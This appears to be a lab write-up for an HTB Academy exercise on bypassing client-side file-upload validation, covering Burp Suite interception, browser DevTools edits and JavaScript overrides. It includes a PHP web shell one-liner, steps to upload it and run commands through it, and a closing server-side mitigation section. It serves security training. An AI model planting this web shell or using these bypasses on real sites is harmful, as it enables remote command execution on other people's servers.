# 🛰️ Client-Side Validation Bypass Techniques

## Introduction

> **[!INFO]** This guide explores methods to bypass client-side validation for uploading PHP files on web applications, using both Burp Suite and browser developer tools.

---

## Bypass Method 1: Using Burp Suite Intercept

### Technique Overview

**Burp Suite:** Modify intercepted HTTP requests to change file types from image to PHP during upload. This method ensures that server-side processing is fooled into accepting the uploaded file as an allowed format.

### Step-by-Step Guide

**Step 1: Capture Upload Request**
```bash
# Select any valid image file in the upload form
# Click Upload button to generate HTTP request
# Request will be intercepted by Burp Suite
```

**Step 2: Modify Request**

```bash
# Change filename from image to PHP
# Replace file content with web shell (e.g., <?php system($_REQUEST['cmd']); ?>)
# Forward modified request to server
```

**Step 3: Verify Upload**
```bash
# Check server response for success message
# Navigate to uploaded file location
# Test command execution
```

---

## Bypass Method 2: Disabling Front-end Validation

### Browser Inspector Method

#### Technique Overview

> **[!WARNING]** This technique involves modifying the client-side JavaScript validation directly in the browser. It can lead to unintended side effects if not carefully managed.

**Step 1: Access Page Inspector**
```bash
# Press [CTRL+SHIFT+C] to toggle Page Inspector
# Click on the profile image/upload area
# Locate the file input element in HTML
```

#### Step-by-Step Guide

**Step 2: Analyze HTML File Input**

```html
<input type="file" name="uploadFile" id="uploadFile" 
       onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```
**Key Elements:**
- **accept=".jpg,.jpeg,.png"** - File dialog filter
- **onchange="checkFile(this)"** - JavaScript validation function

**Step 3: Examine JavaScript Function**

```javascript
function checkFile(File) {
    var extension = File.value.split('.').pop().toLowerCase();
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    } else {
        $("#submit").attr("disabled", false);
    }
}
```

### Removing Validation Function

**Method 1: Remove onchange Attribute**
```html
<!-- Original -->
<input type="file" name="uploadFile" id="uploadFile" 
       onchange="checkFile(this)" accept=".jpg,.jpeg,.png">

<!-- Modified (remove onchange) -->
<input type="file" name="uploadFile" id="uploadFile" 
       accept=".jpg,.jpeg,.png">
```

**Method 2: Remove accept Attribute**
```html
<!-- Original -->
<input type="file" name="uploadFile" id="uploadFile" 
       onchange="checkFile(this)" accept=".jpg,.jpeg,.png">

<!-- Modified (remove accept) -->
<input type="file" name="uploadFile" id="uploadFile" 
       onchange="checkFile(this)">
```

**Method 3: Remove Both Attributes**
```html
<!-- Fully cleaned input -->
<input type="file" name="uploadFile" id="uploadFile">
```

### Browser-Specific Instructions

**Firefox Method:**
1. Right-click on file input → "Inspect Element"
2. Double-click on attribute name to edit
3. Delete unwanted attributes
4. Press Enter to save changes

**Chrome Method:**
1. Right-click on file input → "Inspect"
2. Double-click on attribute to edit
3. Delete content and press Enter
4. Changes are applied immediately

**Edge Method:**
1. Press F12 to open DevTools
2. Use element selector to find file input
3. Edit attributes in HTML panel
4. Changes are applied automatically

### Testing Modified Upload

**Step 1: Upload PHP File**

```bash
# Select PHP web shell file
# No validation errors should occur
# Upload button remains enabled
```

**Step 2: Verify Upload Success**
```bash
# Check for success message
# Locate uploaded file URL
# Test command execution
```

**Step 3: Find Uploaded File Location**

```html
<!-- Inspect profile image after upload -->
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

---

## HTB Academy Lab Solutions

### Lab 1: Basic Client-Side Bypass

**Target:** `HTB{...}`

**Method 1 - Burp Suite Interception:**
```bash
# Step 1: Intercept image upload request
# Step 2: Modify filename to shell.php
# Step 7: Replace content with <?php system($_REQUEST['cmd']); ?>
# Step 8: Forward request
# Step 9: Access http://target/profile_images/shell.php?cmd=cat /flag.txt
```

**Method 2 - Browser DevTools:**
```bash
# Step 1: Press [CTRL+SHIFT+C] in browser
# Step 2: Click on upload area to inspect
# Step 3: Remove onchange="checkFile(this)" from input
# Step 4: Upload PHP shell normally
# Step 5: Access uploaded file and execute commands
```

### Expected Workflow

**1. Reconnaissance:**
```bash
# Test normal image upload → SUCCESS
# Test PHP upload → BLOCKED with error message
# No page refresh during validation → Client-side validation confirmed
```

**2. Bypass Execution:**
```bash
# Choose bypass method (Burp or DevTools)
# Upload PHP web shell
# Verify "File successfully uploaded" response
```

**3. Command Execution:**
```bash
# Navigate to /profile_images/shell.php
# Test: ?cmd=whoami
# Flag: ?cmd=cat /flag.txt
```

---

## Advanced Client-Side Bypass Techniques

### JavaScript Function Overriding

**Method: Redefine Validation Function**

```javascript
// Override checkFile function in browser console
function checkFile(File) {
    // Do nothing - allow all files
    $("#submit").attr("disabled", false);
}
```

### Event Listener Removal

**Method: Remove Event Handlers**
```javascript
// Remove all change event listeners
document.getElementById('uploadFile').onchange = null;

// Or remove all event listeners
document.getElementById('uploadFile').removeEventListener('change', checkFile);
```

### Local Storage Manipulation

**Method: Modify Client-Side Variables**

```javascript
// If validation uses localStorage
localStorage.setItem('allowedExtensions', 'php,phtml,php5');

// If validation uses sessionStorage  
sessionStorage.setItem('fileTypeValidation', 'false');
```

### Form Validation Override

**Method: Disable HTML5 Validation**
```javascript
// Disable form validation
document.querySelector('form').setAttribute('novalidate', 'true');

// Remove required attributes
document.querySelectorAll('[required]').forEach(el => el.removeAttribute('required'));
```

---

## Detection and Mitigation

### Proper Server-Side Validation

**Essential Backend Checks:**

```php
// Always validate on server-side
$allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];

// Check MIME type
if (!in_array($_FILES['file']['type'], $allowedTypes)) {
    die("Invalid file type");
}

// Check file extension
$extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($extension, $allowedExtensions)) {
    die("Invalid file extension");
}

// Check file content (magic bytes)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mimeType = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mimeType, $allowedTypes)) {
    die("File content doesn't match extension");
}
```

### Defense-in-Depth Strategy

**Multiple Validation Layers:**
1. **Client-side validation** - User experience only
2. **Server-side extension check** - File extension validation
3. **MIME type verification** - Content-Type header check
4. **Magic byte analysis** - Actual file content inspection
5. **File size limits** - Prevent DoS attacks
6. **Filename sanitization** - Remove dangerous characters
7. **Isolated storage** - Non-executable upload directory

---

## Conclusion

This guide has provided a comprehensive approach to bypassing client-side validation for uploading PHP files, emphasizing the importance of server-side validation and defense-in-depth strategies.

---